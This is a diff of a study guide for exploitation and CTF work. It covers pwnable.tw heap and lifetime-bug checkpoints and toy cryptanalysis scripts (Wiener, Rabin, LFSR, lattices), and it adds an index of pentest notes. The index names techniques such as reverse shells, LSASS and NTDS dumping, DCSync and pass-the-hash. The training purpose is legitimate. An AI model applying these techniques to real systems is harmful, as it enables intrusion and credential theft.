 **Checkpoint:** establish from the binary whether the zero-size path leaves a dangling pointer, duplicate alias, or another invalid lifetime. Only then consider the proposed tcache/GOT/format-string chain. Source: `ctf-pwn/pwnable-tw/re_alloc.md`.
 
+<a id="13-pwn-practice-atlas--25-re_alloc_revenge-an-error-branch-preserves-an-invalid-owner"></a>
+
 ### 25. `re_alloc_revenge`: an error branch preserves an invalid owner
 
 **Prerequisites:** realloc failure/zero-size behavior, two-slot heap choreography, disclosure alternatives.
@@ -5391,6 +6556,8 @@ The intended lesson is a stale-pointer/lifetime error around zero-size reallocat
 The detailed source describes `realloc(ptr, 0)` freeing storage and returning NULL, followed by an error path that does not clear the stored pointer. Model both slots after every operation and inspect how allocator duplicate-free checks are handled in the exact provided runtime.
 
 **Checkpoint:** show an actual subsequent access through the dangling slot and prove a controlled overlap. The harder version's protection changes require a new target choice; do not carry over writable-GOT assumptions. Source: `ctf-pwn/pwnable-tw/re_alloc_revenge.md`.
+
+<a id="13-pwn-practice-atlas--26-caov-c-temporaries-and-stale-stack-fields-both-affect-ownership"></a>
 
 ### 26. `caov`: C++ temporaries and stale stack fields both affect ownership
 
@@ -5400,6 +6567,8 @@ Returning a data object by value can create a temporary whose destructor release
 
 **Checkpoint:** identify which destructor frees which address, and whether the same pointer still has a live owner. Source: `ctf-pwn/pwnable-tw/caov.md`.
 
+<a id="13-pwn-practice-atlas--27-ghost_party-shallow-copies-violate-unique-ownership"></a>
+
 ### 27. `ghost_party`: shallow copies violate unique ownership
 
 **Prerequisites:** C++ copy constructors, raw owning pointers, virtual dispatch.
@@ -5407,6 +6576,8 @@ Returning a data object by value can create a temporary whose destructor release
 The Vampire class's default copy preserves a pointer that its destructor frees, while another object's temporary string can leave a dangling `c_str` pointer. Compare the vulnerable classes with those that implement correct copying; that contrast helps identify the actual lifetime error.
 
 **Checkpoint:** after the source object or temporary is destroyed, demonstrate the remaining reference and the allocation that reuses its storage. Source: `ctf-pwn/pwnable-tw/ghost_party.md`.
+
+<a id="13-pwn-practice-atlas--28-break_out-a-freed-note-remains-reachable-through-a-linked-object"></a>
 
 ### 28. `break_out`: a freed note remains reachable through a linked object
 
@@ -5416,6 +6587,8 @@ Punishment frees a prisoner's note without clearing its pointer and size. Reallo
 
 **Checkpoint:** a list operation reads a controlled note pointer and an edit writes the predicted region. Validate both before selecting a libc-specific endpoint. Source: `ctf-pwn/pwnable-tw/break_out.md`.
 
+<a id="13-pwn-practice-atlas--29-food_store-an-uninitialized-link-inherits-old-allocation-contents"></a>
+
 ### 29. `food_store`: an uninitialized link inherits old allocation contents
 
 **Prerequisites:** heap reuse, uninitialized fields, linked structures, old-libc FILE constraints.
@@ -5423,6 +6596,8 @@ Punishment frees a prisoner's note without clearing its pointer and size. Reallo
 The individual writeup identifies a recipe `next` pointer never initialized after allocation. A reclaimed chunk can therefore supply a controlled or allocator-derived link. This is more specific than the directory index's generic heap-overflow summary and should guide the first experiment.
 
 **Checkpoint:** record the chunk's previous contents, allocate the recipe, and show which bytes become its next pointer without being written. Follow the resulting list before considering advanced FILE or allocator chains. Source: `ctf-pwn/pwnable-tw/food_store.md`.
+
+<a id="13-pwn-practice-atlas--30-babyallocator-stack-segment-metadata-is-an-allocation-target"></a>
 
 ### 30. `babyallocator`: stack-segment metadata is an allocation target
 
@@ -5432,7 +6607,11 @@ The source describes split-stack segment metadata being corrupted by a non-split
 
 **Checkpoint:** identify the segment boundary and the exact libc write that reaches a metadata field, then prove the resulting returned allocation or frame overlap. Depth/size constants depend on the complete runtime. Source: `ctf-pwn/pwnable-tw/babyallocator.md`.
 
+<a id="13-pwn-practice-atlas--file-stateful-library-and-complex-application-exercises"></a>
+
 ## FILE, stateful library and complex application exercises
+
+<a id="13-pwn-practice-atlas--31-seethefile-a-pointer-overflow-reaches-fclose"></a>
 
 ### 31. `seethefile`: a pointer overflow reaches `fclose`
 
@@ -5442,6 +6621,8 @@ An unbounded exit-name input reaches the neighboring `FILE *`, and the program s
 
 **Checkpoint:** the overwritten pointer reaches your object at `fclose`, with valid supporting state. The old fake-vtable route is not applicable unchanged to modern glibc. Source: `ctf-pwn/pwnable-tw/seethefile.md`.
 
+<a id="13-pwn-practice-atlas--32-wannaheap-validation-updates-one-size-but-not-another"></a>
+
 ### 32. `wannaheap`: validation updates one size but not another
 
 **Prerequisites:** mmap-relative layouts, single-byte writes, stdin FILE behavior, treap-dependent residue.
@@ -5449,6 +6630,8 @@ An unbounded exit-name input reaches the neighboring `FILE *`, and the program s
 The first requested size is remembered even after a replacement size is validated and used for allocation. The terminator is then written using the original value. The source turns this into a null-byte change to stdin buffering, while a separate uninitialized string can disclose a libc pointer.
 
 **Checkpoint:** trace both size variables and observe the terminator address. Verify any mmap-to-libc distance for the supplied runtime and distinguish a probabilistic tree-layout leak from a guaranteed one. Source: `ctf-pwn/pwnable-tw/wannaheap.md`.
+
+<a id="13-pwn-practice-atlas--33-criticalheap-data-types-and-library-side-effects-matter"></a>
 
 ### 33. `criticalheap`: data types and library side effects matter
 
@@ -5458,6 +6641,8 @@ The detailed source describes several independent observations: a user-controlle
 
 **Checkpoint:** distinguish the challenge's stated objective from any decoy file, and identify which local operation yields the required information or write. File paths and helper behavior are specific to the original image. Source: `ctf-pwn/pwnable-tw/criticalheap.md`.
 
+<a id="13-pwn-practice-atlas--34-criticalheap_pp-the-expanded-path-exceeds-the-input-allocation"></a>
+
 ### 34. `criticalheap_pp`: the expanded path exceeds the input allocation
 
 **Prerequisites:** `realpath` output semantics, heap grooming, environment-triggered allocations.
@@ -5465,6 +6650,8 @@ The detailed source describes several independent observations: a user-controlle
 The detailed route uses the same small buffer for a relative input path and its longer resolved output, reaching adjacent allocation metadata. Environment and timezone operations provide additional allocation/free behavior. The directory index's broad C++ type-confusion explanation is not a substitute for measuring this path.
 
 **Checkpoint:** demonstrate the exact resolved path length and write boundary, then record the neighboring chunk affected. Verify the real challenge objective independently of any decoy. Source: `ctf-pwn/pwnable-tw/criticalheap_pp.md`.
+
+<a id="13-pwn-practice-atlas--35-bounty_program_a-a-null-argument-has-stateful-library-meaning"></a>
 
 ### 35. `bounty_program_a`: a NULL argument has stateful library meaning
 
@@ -5474,6 +6661,8 @@ Failed allocation returns NULL, but passing NULL to `strtok` continues a previou
 
 **Checkpoint:** inspect the tokenizer's retained pointer and show the next read or delimiter NUL-write reaches the intended stale buffer. Source: `ctf-pwn/pwnable-tw/bounty_program_a.md`.
 
+<a id="13-pwn-practice-atlas--36-bounty_program_b-a-delimiter-write-can-alter-a-pointer"></a>
+
 ### 36. `bounty_program_b`: a delimiter write can alter a pointer
 
 **Prerequisites:** the alpha variant's tokenizer state, heap overlap, protection-aware object reuse.
@@ -5481,6 +6670,8 @@ Failed allocation returns NULL, but passing NULL to `strtok` continues a previou
 The hardened variant retains stateful tokenization on freed data. Because `strtok` replaces a matching delimiter with NUL, it can modify a byte inside a pointer if that byte equals the delimiter. Recover a real pointer containing that byte and calculate the resulting address before using the overlap.
 
 **Checkpoint:** the intended pointer byte changes while the surrounding object survives its consistency checks. Keep alpha and beta runtime/protection assumptions separate. Source: `ctf-pwn/pwnable-tw/bounty_program_b.md`.
+
+<a id="13-pwn-practice-atlas--37-hitcon_ftp-protocol-state-supplies-both-a-leak-and-a-copy-size"></a>
 
 ### 37. `hitcon_ftp`: protocol state supplies both a leak and a copy size
 
@@ -5490,6 +6681,8 @@ The detailed writeup identifies an option-type check performed only for one arra
 
 **Checkpoint:** decode a minimal valid request first, then show the unchecked object interpretation and the measured stack-write length independently. Preserve the canary and use the actual permitted output descriptor for a later ORW chain. Source: `ctf-pwn/pwnable-tw/hitcon_ftp.md`.
 
+<a id="13-pwn-practice-atlas--38-seccomptools-emulatorkernel-disagreement-is-the-first-bug"></a>
+
 ### 38. `seccomptools`: emulator/kernel disagreement is the first bug
 
 **Prerequisites:** classic BPF, `seccomp_data`, return actions, FILE dispatch.
@@ -5497,6 +6690,8 @@ The detailed writeup identifies an option-type check performed only for one arra
 The detailed source says the user-space emulator fails to implement a length-load instruction that the kernel evaluates differently. A filter accepted under one model can therefore produce a different syscall result in the other. The proposed chain then exploits a synthetic zero return and a stream-pointer overwrite; it is not simply a generic heap-hook attack as the index suggests.
 
 **Checkpoint:** compare both evaluators on the exact small filter before constructing a larger chain. Distinguish `ERRNO(0)` suppressing a syscall from a real successful file open. Source: `ctf-pwn/pwnable-tw/seccomptools.md`.
+
+<a id="13-pwn-practice-atlas--39-stupid_boss-compatible-names-do-not-imply-compatible-layouts"></a>
 
 ### 39. `stupid_boss`: compatible names do not imply compatible layouts
 
@@ -5506,6 +6701,8 @@ The detailed source describes compatibility checks that allow one language objec
 
 **Checkpoint:** compare the two concrete field layouts and show exactly which eight bytes the setter changes. A failed `scanf` conversion may expose stale stack data, but confirm the leaked value's origin before using it. Source: `ctf-pwn/pwnable-tw/stupid_boss.md`.
 
+<a id="13-pwn-practice-atlas--40-digimon-start-with-parser-state-not-an-assumed-race"></a>
+
 ### 40. `digimon`: start with parser state, not an assumed race
 
 **Prerequisites:** unterminated input, `strtok` mutation, stack indices, asynchronous program state.
@@ -5513,6 +6710,8 @@ The detailed source describes compatibility checks that allow one language objec
 The individual writeup prioritizes a full command buffer lacking a NUL terminator, allowing tokenization to reach an adjacent partner index. It also identifies failed numeric conversions as a disclosure path and marks several apparent races/overflows as non-exploitable. The index's generic race-UAF description is therefore insufficient.
 
 **Checkpoint:** use a full-length command to observe the exact index mutation and the subsequent task lookup. Preserve negative findings; do not spend time racing a path the detailed analysis says lacks the needed primitive. Source: `ctf-pwn/pwnable-tw/digimon.md`.
+
+<a id="13-pwn-practice-atlas--41-omegago-gameplay-controls-memory-representation"></a>
 
 ### 41. `omegago`: gameplay controls memory representation
 
@@ -5522,7 +6721,11 @@ The detailed route overfills a board-history array through repeated legal captur
 
 **Checkpoint:** reproduce a short cycle and count history growth, then verify the first out-of-bounds history slot. This differs from the directory index's simpler coordinate-to-GOT narrative. Source: `ctf-pwn/pwnable-tw/omegago.md`.
 
+<a id="13-pwn-practice-atlas--restricted-shell-and-historical-runtime-exercises"></a>
+
 ## Restricted-shell and historical runtime exercises
+
+<a id="13-pwn-practice-atlas--42-bash-distinguish-policy-gaps-from-memory-corruption"></a>
 
 ### 42. `bash`: distinguish policy gaps from memory corruption
 
@@ -5532,6 +6735,8 @@ One historical route relies on the sandbox removing execute permissions from pro
 
 **Checkpoint:** establish which permission or builtin behavior is actually available in the local lab. The original loopback flag service is internal to that image; do not treat loopback services on a competition workstation as challenge targets. Source: `ctf-pwn/pwnable-tw/bash.md`.
 
+<a id="13-pwn-practice-atlas--43-bash_revenge-a-shell-variable-can-become-the-reclaimed-object"></a>
+
 ### 43. `bash_revenge`: a shell variable can become the reclaimed object
 
 **Prerequisites:** the exact old Bash build, out-of-bounds free, Bash's allocator, `SHELL_VAR` layout.
@@ -5539,6 +6744,8 @@ One historical route relies on the sandbox removing execute permissions from pro
 The detailed writeup turns a malformed `popd` index into a free operation and reclaims the region through shell-variable activity. A variable's value pointer can disclose data, and its dynamic callback is a distinct later control target. Model Bash's allocator and variable lifetime rather than applying glibc chunk offsets blindly.
 
 **Checkpoint:** show which address is freed, what allocation reuses it, and when variable expansion dereferences the changed field. All helper/service access stays inside the explicitly supplied practice environment. Source: `ctf-pwn/pwnable-tw/bash_revenge.md`.
+
+<a id="13-pwn-practice-atlas--what-to-retain-after-finishing-a-case"></a>
 
 ## What to retain after finishing a case
 
@@ -5551,11 +6758,17 @@ The source directory index, `ctf-pwn/pwnable-tw/README.md`, is preserved as a hi
 
 <a id="14-advanced-crypto"></a>
 
+<a id="14-advanced-crypto--advanced-cryptography-choose-a-model-you-can-verify"></a>
+
 # Advanced cryptography: choose a model you can verify
+
+**Quick route:** [Short commands](#quickstart--rsa) · [Tool strengths and weaknesses](#tool-chooser--cryptography). Use this chapter for deeper explanations.
 
 Use this chapter after [Cryptography](#07-cryptography). These techniques are retained because the original repository covers considerably more than introductory RSA and XOR. They are not a suggestion to run every attack against every number.
 
 All Python demonstrations run locally with Python 3 in Windows WSL or Kali. Save the named files and run them with `python3`. Where a script imports `math_helpers`, use the helper file from chapter 07 in the same directory. Sage is optional on Kali: the approved sheet records it but gives no installation information. The approved crypto-attacks checkout is also Kali-specific. No online mathematical service is needed here.
+
+<a id="14-advanced-crypto--1-rsa-decision-points-beyond-the-elementary-checks"></a>
 
 ## 1. RSA decision points beyond the elementary checks
 
@@ -5572,6 +6785,8 @@ All Python demonstrations run locally with Python 3 in Windows WSL or Kali. Save
 | Repeated primes or noncoprime exponent | Root enumeration in prime powers | Enumerate all roots and verify each |
 
 ROCA, restricted-digit primes, base-representation primes, dependent primes, and shared high/low bits are key-generation structures. Start by reproducing that generator on a tiny instance. A patterned decimal modulus does not establish patterned factors.
+
+<a id="14-advanced-crypto--2-wiener-a-complete-toy-with-candidate-validation"></a>
 
 ## 2. Wiener: a complete toy with candidate validation
 
@@ -5618,6 +6833,8 @@ print(answer)
 
 Wiener's sufficient bound assumes suitable prime sizes and a genuinely small private exponent. Failure does not prove secure key generation. Do not increase brute-force ranges blindly; inspect whether the source actually biases `d`.
 
+<a id="14-advanced-crypto--3-local-smoothness-factoring-and-fault-checks"></a>
+
 ## 3. Local smoothness factoring and fault checks
 
 Save as `rsa_advanced_toys.py`:
@@ -5657,6 +6874,8 @@ Pollard p−1 depends on smoothness of the factor's predecessor, not the size of
 
 Williams p+1 and ECM require different machinery. In the approved Kali crypto-attacks checkout, inspect the relevant implementation's signature and required parameters before importing it. Do not install YAFU: it is explicitly unapproved. A missing local factoring dependency is a limitation to record, not permission to upload the modulus.
 
+<a id="14-advanced-crypto--4-nonunique-roots-rabin-and-unusual-totients"></a>
+
 ## 4. Nonunique roots, Rabin, and unusual totients
 
 Rabin encryption squares a message modulo `pq`. With distinct primes congruent to 3 modulo 4, square roots can be recovered separately and recombined into four candidates.
@@ -5683,6 +6902,8 @@ print(sorted(roots))
 Encoding or redundancy selects a candidate; the mathematics alone does not know the flag format. Repeated factors, roots modulo prime powers, Schmidt–Samoa `p²q`, quaternion exponents, and custom expressions such as `(p^4-1)(q^4-1)` need the group actually used by the program. Do not rename such an expression `phi` and assume textbook RSA proof applies.
 
 If a modulus is hidden, collect several known plaintext/ciphertext pairs and compute local GCDs of exact encryption residuals. The result may be a multiple of `n`; require it to fit ciphertext ranges and every sample. Large exponents can make unreduced powers expensive, so assess input size first.
+
+<a id="14-advanced-crypto--5-small-roots-and-polynomial-relations"></a>
 
 ## 5. Small roots and polynomial relations
 
@@ -5715,6 +6936,8 @@ print(roots)
 Run `sage small_root.sage`. This checks environment and syntax, not the feasibility of a hard RSA attack. For the actual challenge, derive the polynomial and bounds from source. A monic-polynomial requirement, noninvertible leading coefficient, wrong root size, or wrong modulus commonly causes failure.
 
 Hensel lifting solves roots modulo `p^k` from roots modulo `p` when its derivative conditions hold. If the derivative vanishes modulo `p`, branches can disappear or multiply; do not apply the simple-root formula blindly. Polynomial CRT over `GF(2)[x]` uses coprime polynomials, not integer moduli.
+
+<a id="14-advanced-crypto--6-discrete-logarithms-with-explicit-bounds"></a>
 
 ## 6. Discrete logarithms with explicit bounds
 
@@ -5753,6 +6976,8 @@ For Pohlig–Hellman, factor the **group order**, solve prime-power subgroup log
 
 Sparse exponents can permit a meet-in-the-middle search over positions instead of all integer values. Count combinations first and verify the sparsity promise from source. A low Hamming weight guess without evidence can be more expensive than ordinary BSGS.
 
+<a id="14-advanced-crypto--7-elliptic-curve-triage"></a>
+
 ## 7. Elliptic-curve triage
 
 Write down the curve model, field, coefficients, base point, subgroup order, cofactor, point encoding, and validation routine. The following are distinct failure families:
@@ -5773,6 +6998,8 @@ Point negation, infinity encoding, and malformed points differ across libraries.
 Clock groups satisfying `x²+y²=1`, singular curves with additive/multiplicative parameterizations, and endomorphism-based constructions can reduce to more familiar groups. Derive and test the map on toy points: it must preserve the operation and handle exceptional points. CM/GLV structure alone does not break correctly implemented standard curves.
 
 Isogeny challenges need the exact curve and isogeny construction. Determine what the public key reveals and whether parameters are deliberately weakened; do not treat an isogeny keyword as permission to apply an unrelated historical attack.
+
+<a id="14-advanced-crypto--8-linear-algebra-over-gf2"></a>
 
 ## 8. Linear algebra over GF(2)
 
@@ -5817,6 +7044,8 @@ print(bin(recovered))
 ```
 
 If rank is low, more repeated versions of the same equation will not help. Choose inputs that excite different state bits. For affine CRC relations, subtract/XOR a fixed baseline before building the linear matrix. Validate the final patch with the original checksum routine.
+
+<a id="14-advanced-crypto--9-lfsr-recovery-with-berlekampmassey"></a>
 
 ## 9. LFSR recovery with Berlekamp–Massey
 
@@ -5865,6 +7094,8 @@ Expected recurrence coefficients are `[1, 1, 0, 0, 1]`. Always verify on held-ou
 
 RC4 second-byte bias is statistical across many independent keys; it is not a deterministic two-byte decryption trick. RC4A, VMPC, and Spritz modify the generator, so identify the update algorithm. Trivium, Grain, and Mickey analyses depend strongly on reduced rounds, warmup, and access to chosen IVs.
 
+<a id="14-advanced-crypto--10-lattices-build-the-equations-before-the-basis"></a>
+
 ## 10. Lattices: build the equations before the basis
 
 LLL finds a reduced basis; it is not a command that directly returns a private key. BKZ is stronger and more expensive. Babai estimates a nearby lattice point; exact CVP/SVP have different costs. A short output row must be interpreted and checked in the original problem.
@@ -5894,6 +7125,8 @@ Ring-LWE and Module-LWE can be flattened into matrices, but only with the correc
 
 BDD predicates and LadderLeak-style leakage use additional side information, not just a generic lattice basis. Count how much information each signature gives and whether the predicate is reliable. A tiny bias may require substantially more samples than a full known nonce bit.
 
+<a id="14-advanced-crypto--11-post-quantum-recognition-without-misleading-promises"></a>
+
 ## 11. Post-quantum recognition without misleading promises
 
 ML-KEM/Kyber hints include module vectors, polynomial degree 256, modulus 3329, NTT operations, and compression. ML-DSA/Dilithium uses a different modulus and signature structure. Confirm the source instead of classifying by a single constant.
@@ -5901,6 +7134,8 @@ ML-KEM/Kyber hints include module vectors, polynomial degree 256, modulus 3329, 
 Look for challenge-specific departures: unusually tiny dimensions, exposed noise, repeated randomness, unchecked verification fields, corrupted signatures, or implementation faults. Kannan embeddings, algebraic Arora–Ge models, and primal/dual estimators answer different questions. An estimator predicts cost; it does not recover a secret.
 
 MAYO and other multivariate signatures require the actual public polynomial system and fault model. A malformed signature only helps if it reveals a relation to secret structure. Keep the mathematics local; AI/ML libraries remain forbidden even when a cryptographic scheme has a similar abbreviation.
+
+<a id="14-advanced-crypto--12-shamir-and-crt-secret-sharing"></a>
 
 ## 12. Shamir and CRT secret sharing
 
@@ -5929,6 +7164,8 @@ Repeated x-coordinates do not add independent shares. Deterministic coefficients
 
 Asmuth–Bloom uses a different CRT-based construction with size inequalities. Recovering a congruence class is not enough if several candidates remain within the allowed secret range. Check those bounds explicitly.
 
+<a id="14-advanced-crypto--13-authenticated-encryption-and-reduced-round-designs"></a>
+
 ## 13. Authenticated encryption and reduced-round designs
 
 GCM nonce reuse repeats CTR keystream and creates equations involving GHASH's authentication subkey. GHASH works in `GF(2^128)` with a specified bit convention; integer arithmetic modulo a large prime is not interchangeable. Full/partial tags, associated data, ciphertext lengths, and multiple polynomial roots all affect recovery.
@@ -5940,6 +7177,8 @@ Partitioning oracles and non-key-committing AEAD need a verifier that reveals wh
 Reduced-round AES Square attacks require chosen plaintext sets with the required balanced structure. S-box intersection needs controlled differences and an identifiable round boundary. Non-permutation S-boxes can yield collisions, but the collision must survive the surrounding rounds. ForkAES reflective differentials and faulty ChaCha rotations similarly require the exact modified construction.
 
 For sponge designs, record rate, capacity, permutation, domain separation, padding, and round count. Keccak, Ascon, Gimli, and Sparkle are not interchangeable. A small-capacity meet-in-the-middle toy does not imply an attack on a full-strength standardized hash.
+
+<a id="14-advanced-crypto--14-rsa-oracles-define-the-predicate-precisely"></a>
 
 ## 14. RSA oracles: define the predicate precisely
 
@@ -5954,6 +7193,8 @@ For sponge designs, record rate, capacity, permutation, domain separation, paddi
 An error string may combine several rejection stages. If the service checks a hash, length, padding, and text decoding, identify which stage creates the signal. Bleichenbacher and Manger are query-sensitive; estimate the budget before committing.
 
 Use exact fractions or integer intervals, never floating-point bounds. At the end, search the tiny remaining interval and re-encrypt every candidate. With noisy observations, retain uncertainty or backtrack rather than allowing one wrong bit to corrupt the whole result.
+
+<a id="14-advanced-crypto--15-zero-knowledge-proofs-signatures-and-garbled-circuits"></a>
 
 ## 15. Zero-knowledge proofs, signatures, and garbled circuits
 
@@ -5974,6 +7215,8 @@ The source's FROST heading can mislead: classify the concrete construction from 
 
 Graph three-coloring and other constraint puzzles can be modelled with a non-AI SMT library if available under the Python-library rule. Bound every variable and verify the model against the original checker. Bit-vectors use fixed-width arithmetic; integers do not overflow unless explicitly constrained.
 
+<a id="14-advanced-crypto--16-unusual-algebra-reduce-to-something-measurable"></a>
+
 ## 16. Unusual algebra: reduce to something measurable
 
 | Construction in the sources | First diagnostic | Useful next action |
@@ -5993,6 +7236,8 @@ For a matrix or exotic group, verify the operation, identity, inverse, and order
 
 BIP39 partial-mnemonic puzzles combine a finite word-index space, checksum bits, and often a known address. Recover only organizer-provided toy wallets. Do not query public wallet services with private material; checksum acceptance alone does not establish the target wallet.
 
+<a id="14-advanced-crypto--17-historical-media-and-error-correcting-crypto"></a>
+
 ## 17. Historical, media, and error-correcting crypto
 
 Lorenz/Tunny and rotating-wheel ciphers need their alphabet encoding, wheel lengths, stepping rules, and alignment. Start with a short known plaintext and check wheel motion; do not apply ordinary Vigenère frequency analysis to teleprinter bits unchanged.
@@ -6000,6 +7245,8 @@ Lorenz/Tunny and rotating-wheel ciphers need their alphabet encoding, wheel leng
 Hamming codes and interleaving are error correction, not encryption. Identify codeword size, parity placement, and interleaver permutation; compute syndromes on a few known words before decoding an entire file. Nibble-reassembly and random-padding formats similarly need a field layout before byte reconstruction.
 
 For image shifts, grid permutations, and Arnold-cat-map scrambling, preserve dimensions and distinguish coordinate transforms from pixel-value transforms. Check one round on a coordinate grid, then invert it. A visually plausible image can still be mirrored or shifted by one pixel.
+
+<a id="14-advanced-crypto--18-stopping-rules-that-save-time"></a>
 
 ## 18. Stopping rules that save time
 
@@ -6010,13 +7257,6052 @@ Before accepting a result, validate it outside the solver: re-encrypt, recompute
 
 ---
 
+<a id="cpts"></a>
+
+<a id="cpts--vernons-cpts-notes"></a>
+
+# Vernon's CPTS notes
+
+**102 personal notes**, organized as in the Obsidian vault. Screenshots are included offline.
+
+These are your original study notes, not a competition-approved tool list. Check [event tool rules](#competition--what-is-allowed) before using their tools or setup commands.
+
+Browse the folders in the sidebar, or use the main search. The ZIP contains the original Markdown and screenshots; [CPTS notes as one Markdown file](CPTS-NOTES.md) is also included.
+
+<a id="cpts--general"></a>
+
+## General
+
+- [External Resources](#cpts-external-resources-8d4c7c1a)
+- [Things to run on base Kali](#cpts-things-to-run-on-base-kali-16524e15)
+<a id="cpts--enumerationad-enumeration"></a>
+
+## Enumeration/AD Enumeration
+
+- [Advanced Domain Enumeration](#cpts-enumeration-ad-enumeration-advanced-domain-enumeration-ea04e6f6)
+- [Basic Enumeration](#cpts-enumeration-ad-enumeration-basic-enumeration-aa8ec53e)
+- [Methodology](#cpts-enumeration-ad-enumeration-methodology-4ece01a2)
+- [Password Policy Discovery](#cpts-enumeration-ad-enumeration-password-policy-discovery-75263604)
+- [User Enumeration](#cpts-enumeration-ad-enumeration-user-enumeration-247f74c0)
+<a id="cpts--enumerationbasic-enumeration"></a>
+
+## Enumeration/Basic Enumeration
+
+- [netcat](#cpts-enumeration-basic-enumeration-netcat-3782f2cb)
+- [nmap](#cpts-enumeration-basic-enumeration-nmap-71f192fc)
+- [whatweb](#cpts-enumeration-basic-enumeration-whatweb-968b4bb4)
+- [wpscan](#cpts-enumeration-basic-enumeration-wpscan-f89cb6da)
+<a id="cpts--enumerationservice-enumeration"></a>
+
+## Enumeration/Service Enumeration
+
+- [111,2049 nfs](#cpts-enumeration-service-enumeration-111-2049-nfs-e3cbe8f1)
+- [135 WMI](#cpts-enumeration-service-enumeration-135-wmi-e1af59a1)
+- [139,445 smb](#cpts-enumeration-service-enumeration-139-445-smb-fb8e6af0)
+- [143,993 imap-pop3](#cpts-enumeration-service-enumeration-143-993-imap-pop3-52cb67bb)
+- [1433 mssql](#cpts-enumeration-service-enumeration-1433-mssql-0715e518)
+- [1521 oracle-tns](#cpts-enumeration-service-enumeration-1521-oracle-tns-40e2c3f8)
+- [161,162 snmp](#cpts-enumeration-service-enumeration-161-162-snmp-122c9bd9)
+- [21 ftp](#cpts-enumeration-service-enumeration-21-ftp-2bf7eeb6)
+- [22 ssh](#cpts-enumeration-service-enumeration-22-ssh-cb7e3280)
+- [25,587 smtp](#cpts-enumeration-service-enumeration-25-587-smtp-a77466e5)
+- [3306 mysql](#cpts-enumeration-service-enumeration-3306-mysql-3d7e83f5)
+- [3389 rdp](#cpts-enumeration-service-enumeration-3389-rdp-2169bdb7)
+- [512-514 r-services](#cpts-enumeration-service-enumeration-512-514-r-services-39d8144a)
+- [53 dns](#cpts-enumeration-service-enumeration-53-dns-982aa88f)
+- [5985,5986 WinRM](#cpts-enumeration-service-enumeration-5985-5986-winrm-4ff73d47)
+- [623 IPMI](#cpts-enumeration-service-enumeration-623-ipmi-fd1b107c)
+- [80,443 http](#cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8)
+- [873 rsync](#cpts-enumeration-service-enumeration-873-rsync-1ea34b15)
+- [Public Exploits](#cpts-enumeration-service-enumeration-public-exploits-06f789b1)
+<a id="cpts--exploits"></a>
+
+## Exploits
+
+- [Bind Shell](#cpts-exploits-bind-shell-47d00c53)
+- [Password Cracking](#cpts-exploits-password-cracking-c9c27216)
+- [Password Spraying (Brute forcing)](#cpts-exploits-password-spraying-brute-forcing-002cc339)
+- [Reverse Shell](#cpts-exploits-reverse-shell-a7dfcd09)
+<a id="cpts--exploitsad-exploits"></a>
+
+## Exploits/AD-Exploits
+
+- [AS-REP Roasting](#cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b)
+- [DCSync Attack](#cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d)
+- [Kerberoasting](#cpts-exploits-ad-exploits-kerberoasting-8eb4e711)
+- [LLMNR-NBTNS Poisoning](#cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994)
+- [Silver Ticket Attack](#cpts-exploits-ad-exploits-silver-ticket-attack-996b78a5)
+<a id="cpts--exploitsservice-exploits"></a>
+
+## Exploits/Service-Exploits
+
+- [DNS](#cpts-exploits-service-exploits-dns-1358e590)
+- [FTP](#cpts-exploits-service-exploits-ftp-73147af4)
+- [RDP](#cpts-exploits-service-exploits-rdp-76d94045)
+- [SMB](#cpts-exploits-service-exploits-smb-0ab037f4)
+- [SMTP-IMAP-POP3](#cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e)
+- [SQL](#cpts-exploits-service-exploits-sql-fcb4d003)
+<a id="cpts--misc"></a>
+
+## Misc
+
+- [Convert ccache or kirbi file to and fro](#cpts-misc-convert-ccache-or-kirbi-file-to-and-fro-9b4c4171)
+- [Double Pivot](#cpts-misc-double-pivot-ac26bf28)
+- [Gaining Shell Access](#cpts-misc-gaining-shell-access-b83293f9)
+- [MS Office Macro](#cpts-misc-ms-office-macro-8ec8c7ff)
+- [Pivot with Ligolo](#cpts-misc-pivot-with-ligolo-111fca60)
+- [Runas another user](#cpts-misc-runas-another-user-4be36188)
+- [Search for flag on compromised system](#cpts-misc-search-for-flag-on-compromised-system-225a86d6)
+- [Transferring Files (Linux)](#cpts-misc-transferring-files-linux-5d70baa3)
+- [Transferring Files (Windows)](#cpts-misc-transferring-files-windows-089b5bd9)
+- [Transferring Files](#cpts-misc-transferring-files-9a1f8b61)
+- [make new admin user in windows](#cpts-misc-make-new-admin-user-in-windows-e17c21fa)
+- [non-tty shell to tty shell](#cpts-misc-non-tty-shell-to-tty-shell-7f6f46ec)
+<a id="cpts--post-exploits"></a>
+
+## Post Exploits
+
+- [Port Forwarding](#cpts-post-exploits-port-forwarding-d33c6cbd)
+<a id="cpts--post-exploitslinux"></a>
+
+## Post Exploits/Linux
+
+- [Cracking Login Credentials](#cpts-post-exploits-linux-cracking-login-credentials-3cabf121)
+- [Credential Hunting](#cpts-post-exploits-linux-credential-hunting-a70f40cf)
+- [Pass the Ticket (PtT)](#cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa)
+<a id="cpts--post-exploitswindows"></a>
+
+## Post Exploits/Windows
+
+- [DCOM](#cpts-post-exploits-windows-dcom-f7ad3a18)
+- [Dumping out CredMan](#cpts-post-exploits-windows-dumping-out-credman-2c400c4d)
+- [Dumping out LSASS](#cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd)
+- [Dumping out NTDS.dit](#cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253)
+- [Dumping out SAM](#cpts-post-exploits-windows-dumping-out-sam-8475da60)
+- [Invoke-RunasCs](#cpts-post-exploits-windows-invoke-runascs-82bcc924)
+- [NTLMv2 Relay](#cpts-post-exploits-windows-ntlmv2-relay-1a9fa4cb)
+- [Overpass the Hash](#cpts-post-exploits-windows-overpass-the-hash-9f40f285)
+- [Pass the Hash](#cpts-post-exploits-windows-pass-the-hash-b577bda5)
+- [Pass the Ticket (PtT)](#cpts-post-exploits-windows-pass-the-ticket-ptt-22d39f78)
+- [Psexec](#cpts-post-exploits-windows-psexec-54de10de)
+- [Searching for traces](#cpts-post-exploits-windows-searching-for-traces-30841cff)
+- [WMI & WinRM](#cpts-post-exploits-windows-wmi-winrm-6f7840cf)
+<a id="cpts--privesc"></a>
+
+## PrivEsc
+
+- [$PATH](#cpts-privesc-path-83561099)
+- [SSH Keys](#cpts-privesc-ssh-keys-9d5895fc)
